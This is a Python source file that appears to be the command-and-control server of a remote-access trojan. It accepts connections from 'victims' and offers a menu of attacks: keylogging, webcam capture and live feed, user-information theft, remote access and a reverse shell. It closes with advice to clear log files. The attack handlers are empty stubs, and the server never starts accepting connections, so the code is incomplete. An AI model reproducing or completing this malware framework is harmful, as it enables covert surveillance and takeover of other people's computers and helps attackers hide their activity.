from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
import sys
import time
import server_config

KEY_LOGGER = "keylogger.py"
REMOTE_ACCESS = "remote_access.py"
CHECK_WEBCAM = "check_webcam.py"
WEBCAM_CAPTURE_PIC = "capture_pic.py"
WEBCAM_LIVE = "live_feed.py"
USER_INFORMATION = "user_information.py"

# Server Configurations
clients = {}
addresses = {}

HOST = server_config.SERVER_HOST
PORT = server_config.SERVER_PORT
BUFFERSIZE = 1024
ADDR = (HOST, PORT)
SERVER = socket(AF_INET, SOCK_STREAM)
SERVER.bind(ADDR)

def incoming_msg():
    while True:
        client, client_address = SERVER.accept()
        print("Connection established: %s:%s" % client_address)
        addresses[client] = client_address
        Thread(target=client_connection, args=(client,)).start()

def client_connection(client):
    checking = False
    client.send(bytes("First Check!", "utf8"))
    first_check = client.recv(BUFFERSIZE).decode("utf8")
    if first_check == "First Check Received!":
        checking = True
        while checking:
            print("The Connection is established! Victim receive now commands!")
            print("-----------------------------------------------------------")
            print("1) Start a Remote Keylogger!")
            print("2) Check if an Active WebCam is available!")
            print("3) Get User information!")
            print("4) Try Remote Access!")
            print("5) Open WebCam live feed!")
            print("6) Get live Photo of WebCam!")
            print("7) Send 'Say Cheese' Pop up and take Picture!")
            print("8) Create a Reverse Shell!")
            print("q) Close connection to victim!")
            print()
            attack = input("Choose a Command/Attack: ")
            if attack == "1":
                pass
            elif attack == "2":
                pass
            elif attack == "3":
                pass
            elif attack == "4":
                pass
            elif attack == "5":
                pass
            elif attack == "6":
                pass
            elif attack == "7":
                pass
            elif attack == "q":
                print("All connections will be closed!")
                checking = False
                print("All Connections are now Closed! Don't forget to clear your log files!")
                time.sleep(3)
                sys.exit()
            else:
                print("Wrong input!")

if __name__ == "__main__":
    SERVER.listen(10) # Max Victim Count!
    print("Waiting for a Connection from the Victims... ")